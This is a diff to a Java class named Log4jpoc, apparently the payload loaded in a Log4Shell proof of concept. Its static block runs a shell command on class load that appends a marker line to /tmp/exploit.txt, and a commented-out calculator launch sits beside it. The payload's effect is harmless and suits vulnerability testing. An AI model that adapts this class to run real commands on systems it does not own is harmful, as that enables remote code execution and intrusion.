@@ -1,29 +1,19 @@
-import java.io.BufferedWriter;
-import java.io.File;  // Import the File class
-import java.io.FileWriter;
-import java.io.IOException;  // Import the IOException class to handle errors
-import java.sql.Timestamp;
-
-
 public class Log4jpoc {
     public Log4jpoc() {}
     static {
         try {
+            /*String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
+                    ? new String[]{"cmd.exe","/c", "calc.exe"}
+                    : new String[]{"open","/System/Applications/Calculator.app"};
+            java.lang.Runtime.getRuntime().exec(cmds).waitFor();*/
             System.out.println("Exploited");
-            File myObj = new File("/tmp/testfile.txt");
-            Timestamp timestamp = new Timestamp(System.currentTimeMillis());
-            if (myObj.createNewFile()) {
-              System.out.println("File created: " + myObj.getName());
-              
-            } else {
-              System.out.println("File already exists, writing timestamp to it");
-              BufferedWriter out = new BufferedWriter(
-                      new FileWriter("/tmp/testfile.txt", true));
-              
-              out.write(timestamp+"\n");
-              out.newLine();
-              out.close();
-            }
+            String[] cmd = {
+                "/bin/sh",
+                "-c",
+                "echo 'exploited' >> /tmp/exploit.txt"
+            };
+            Process p = Runtime.getRuntime().exec(cmd);
+            
         }catch (Exception e){
             e.printStackTrace();
         }
